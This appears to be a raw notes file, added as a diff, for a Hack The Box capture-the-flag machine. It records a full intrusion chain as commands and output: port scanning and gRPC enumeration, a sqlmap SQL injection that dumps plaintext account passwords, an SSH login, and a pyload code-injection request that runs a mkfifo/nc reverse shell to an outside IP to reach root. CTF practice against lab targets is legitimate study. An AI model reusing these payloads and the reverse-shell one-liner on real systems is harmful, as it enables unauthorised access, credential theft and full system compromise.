@@ -1,0 +1,264 @@
+└─$ nmap -sCV -Pn -p- 10.10.11.214 2>/dev/null
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 14:08 +07
+Nmap scan report for 10.10.11.214
+Host is up (0.15s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
+|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
+|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
+50051/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port50051-TCP:V=7.93%I=7%D=5/29%Time=647451C5%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0
+SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Generic
+SF:Lines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
+SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetRe
+SF:quest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
+SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPO
+SF:ptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
+SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSP
+SF:Request,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
+SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPC
+SF:Check,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
+SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVe
+SF:rsionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\
+SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0
+SF:")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0
+SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\
+SF:0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0
+SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\
+SF:0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0
+SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0
+SF:\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
+SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
+SF:\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?
+SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0
+SF:8\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
+SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
+SF:0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
+SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
+SF:0\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
+SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
+SF:0\0\0\0\0\?\0\0");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 619.31 seconds
+
+
+
+nc 10.10.11.214 50051
+
+=>>> grpc <<<=
+
+
+./grpc_cli ls 10.10.11.214:50051
+
+./grpc_cli call 10.10.11.214:50051 SimpleApp
+
+└─$ ./grpc_cli ls 10.10.11.214:50051 SimpleApp -l
+filename: app.proto
+service SimpleApp {
+  rpc LoginUser(LoginUserRequest) returns (LoginUserResponse) {}
+  rpc RegisterUser(RegisterUserRequest) returns (RegisterUserResponse) {}
+  rpc getInfo(getInfoRequest) returns (getInfoResponse) {}
+}
+
+./grpc_cli ls 10.10.11.214:50051 app.SimpleApp.LoginUser -l
+
+└─$ ./grpc_cli ls 10.10.11.214:50051 SimpleApp/LoginUser -l
+  rpc LoginUser(LoginUserRequest) returns (LoginUserResponse) {}
+ 
+└─$ ./grpc_cli type 10.10.11.214:50051 RegisterUserRequest
+	message RegisterUserRequest {
+	string username = 1;
+	string password = 2;
+	}
+
+└─$ ./grpc_cli type 10.10.11.214:50051 getInfoRequest
+message getInfoRequest {
+  string id = 1;
+}
+
+
+./grpc_cli call 10.10.11.214:50051 RegisterUser "username:'anhndt';password:'anhndt'"
+
+
+
+└─$ ./grpc_cli call 10.10.11.214:50051 RegisterUser "username:'anhndt';password:'anhndt'"
+connecting to 10.10.11.214:50051
+message: "Account created for user anhndt!"
+Rpc succeeded with OK status
+
+./grpc_cli call 10.10.11.214:50051 LoginUser "username:'anhndt';password:'anhndt'"
+
+└─$ ./grpc_cli call 10.10.11.214:50051 LoginUser "username:'anhndt';password:'anhndt'"
+connecting to 10.10.11.214:50051
+message: "Your id is 558."
+Received trailing metadata from server:
+token : b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYW5obmR0IiwiZXhwIjoxNjg1NDQ1NTM4fQ.92cU1z8Pln-pZlgYuSXxhNeED8ep5Yk_HOvwxXDaW6w'
+Rpc succeeded with OK status
+
+./grpc_cli call 10.10.11.214:50051 getInfo "id:'1'"
+
+./grpc_cli call --json_input --json_output 10.10.11.214:50051 getInfo "{'id':'558'}" -metadata "token : b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYW5obmR0IiwiZXhwIjoxNjg1NDQ1NTM4fQ.92cU1z8Pln-pZlgYuSXxhNeED8ep5Yk_HOvwxXDaW6w'"
+
+./grpc_cli call 10.10.11.214:50051 getInfo "id:'1'" -metadata "token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYW5obmR0IiwiZXhwIjoxNjg1NDQ1NTM4fQ.92cU1z8Pln-pZlgYuSXxhNeED8ep5Yk_HOvwxXDaW6w"
+
+└─$ ./grpc_cli call 10.10.11.214:50051 getInfo "id:'1'" -metadata "token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYW5obmR0IiwiZXhwIjoxNjg1NDQ1NTM4fQ.92cU1z8Pln-pZlgYuSXxhNeED8ep5Yk_HOvwxXDaW6w"
+connecting to 10.10.11.214:50051
+Sending client initial metadata:
+token : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYW5obmR0IiwiZXhwIjoxNjg1NDQ1NTM4fQ.92cU1z8Pln-pZlgYuSXxhNeED8ep5Yk_HOvwxXDaW6w
+message: "The admin is working hard to fix the issues."
+Rpc succeeded with OK status
+
+./grpc_cli ls 10.10.11.214:50051 SimpleApp -l -metadata "token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYW5obmR0IiwiZXhwIjoxNjg1NDQ1NTM4fQ.92cU1z8Pln-pZlgYuSXxhNeED8ep5Yk_HOvwxXDaW6w"
+
+
+
+┌──(anhndt㉿Laptop14)-[~/htb/pc.htb/grpc/cmake/build]
+└─$ ./grpc_cli call 10.10.11.214:50051 LoginUser "username:'anhndt';password:'anhndt'"
+connecting to 10.10.11.214:50051
+message: "Your id is 454."
+Received trailing metadata from server:
+token : b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYW5obmR0IiwiZXhwIjoxNjg1NDQ3MjY0fQ.VTpRApSfJsaOmuvrJRLGEvHnizkptgp1zLblwbvAgFE'
+Rpc succeeded with OK status
+
+┌──(anhndt㉿Laptop14)-[~/htb/pc.htb/grpc/cmake/build]
+└─$ ./grpc_cli call 10.10.11.214:50051 getInfo "id:'1'" -metadata "token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYW5obmR0IiwiZXhwIjoxNjg1NDQ3MjY0fQ.VTpRApSfJsaOmuvrJRLGEvHnizkptgp1zLblwbvAgFE"
+connecting to 10.10.11.214:50051
+Sending client initial metadata:
+token : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYW5obmR0IiwiZXhwIjoxNjg1NDQ3MjY0fQ.VTpRApSfJsaOmuvrJRLGEvHnizkptgp1zLblwbvAgFE
+message: "Will update soon."
+Rpc succeeded with OK status
+
+
+./grpc_cli call 10.10.11.214:50051 -metadata "token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYW5obmR0IiwiZXhwIjoxNjg1NDQ3MjY0fQ.VTpRApSfJsaOmuvrJRLGEvHnizkptgp1zLblwbvAgFE" getInfo "id:'1'"
+
+
+./grpc_cli call 10.10.11.214:50051 -metadata "token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYW5obmR0IiwiZXhwIjoxNjg1NDUxNDYyfQ.Izg5q7SmIleIZB5XuM7DQtKH7WH1hz7luq8kcSMBS-Q" getInfo "id:'1;'"
+
+┌──(anhndt㉿Laptop14)-[~/htb/pc.htb/grpc/cmake/build]
+└─$ ./grpc_cli call 10.10.11.214:50051 LoginUser "username:'admin';password:'admin'"
+connecting to 10.10.11.214:50051
+message: "Your id is 218."
+Received trailing metadata from server:
+token : b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODU0NTExNjR9.3ujWZvew5TIH_hcKuMCK-bV1jV2wM81ZkHbmyMnmMTw'
+Rpc succeeded with OK status
+
+./grpc_cli call 10.10.11.214:50051 -metadata "token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODU1MjQwMTZ9.vmUr-HAJ4GjJEhL6E5fabfu9P04ojbVcjZkgYIHfk3A" getInfo "id:'1'"
+
+
+./grpc_cli call 10.10.11.214:50051 -metadata "token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYW5obmR0IiwiZXhwIjoxNjg1NTI2OTE1fQ.u-HXnyDOj1j82nHZXaMHtmMEjwhncHSI2hI7t7dSR5k" getInfo "id:'538 and username==\'admin\''"
+
+
+sqlmap -l /mnt/d/GitProjects/HackTheBox/Easy-Pc.htb/getInfo -o --level=5  --risk=3 -b --dbms=SQLite -p 'id' --dbs
+
+[2 tables]
++----------+
+| accounts |
+| messages |
++----------+
+
+sqlmap -l /mnt/d/GitProjects/HackTheBox/Easy-Pc.htb/getInfo -o --level=5  --risk=3 -b --dbms=SQLite -p 'id' -T 'accounts' --columns
+
+[2 columns]
++----------+------+
+| Column   | Type |
++----------+------+
+| password | TEXT |
+| username | TEXT |
++----------+------+
+
+
+sqlmap -l /mnt/d/GitProjects/HackTheBox/Easy-Pc.htb/getInfo -o --level=5  --risk=3 -b --dbms=SQLite -p 'id' -T 'accounts' --dump
+
+
+[2 entries]
++------------------------+----------+
+| password               | username |
++------------------------+----------+
+| admin                  | admin    |
+| HereIsYourPassWord1431 | sau      |
++------------------------+----------+
+
+
+ssh sau@10.10.11.214
+HereIsYourPassWord1431
+
+
+find / -group sau 2>/dev/null
+
+/home/sau
+/home/sau/.bash_logout
+/home/sau/user.txt
+/home/sau/.cache
+/home/sau/.cache/motd.legal-displayed
+/home/sau/.bashrc
+/home/sau/.profile
+/run/user/1001
+/run/user/1001/snapd-session-agent.socket
+/run/user/1001/pk-debconf-socket
+/run/user/1001/gnupg
+/run/user/1001/gnupg/S.gpg-agent
+/run/user/1001/gnupg/S.gpg-agent.ssh
+/run/user/1001/gnupg/S.gpg-agent.extra
+/run/user/1001/gnupg/S.gpg-agent.browser
+/run/user/1001/gnupg/S.dirmngr
+/run/user/1001/bus
+/run/user/1001/systemd
+/run/user/1001/systemd/private
+/run/user/1001/systemd/notify
+/run/user/1001/systemd/units
+/run/user/1001/systemd/units/invocation:dbus.socket
+/run/user/1001/inaccessible
+
+
+find / -user sau 2>/dev/null
+
+/home/sau
+/home/sau/.bash_logout
+/home/sau/user.txt
+/home/sau/.cache
+/home/sau/.cache/motd.legal-displayed
+/home/sau/.bashrc
+/home/sau/.profile
+/run/user/1001
+/run/user/1001/snapd-session-agent.socket
+/run/user/1001/pk-debconf-socket
+/run/user/1001/gnupg
+/run/user/1001/gnupg/S.gpg-agent
+/run/user/1001/gnupg/S.gpg-agent.ssh
+/run/user/1001/gnupg/S.gpg-agent.extra
+/run/user/1001/gnupg/S.gpg-agent.browser
+/run/user/1001/gnupg/S.dirmngr
+/run/user/1001/bus
+/run/user/1001/systemd
+/run/user/1001/systemd/private
+/run/user/1001/systemd/notify
+/run/user/1001/systemd/units
+/run/user/1001/systemd/units/invocation:dbus.socket
+/run/user/1001/inaccessible
+
+find / -type d -perm -o+w
+
+pspy64
+
+/usr/bin/python3 /usr/local/bin/pyload
+/usr/bin/python3 /opt/app/app.py
+
+
+linpeas => 127.0.0.1:8000 => pyload
+
+
+curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'
+
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.49 7050 >/tmp/f' > touch /tmp/test/mbcn.sh
+chmod 777 /tmp/test/mbcn.sh
+
+curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"/tmp/test/mbcn.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'
+
+=> root
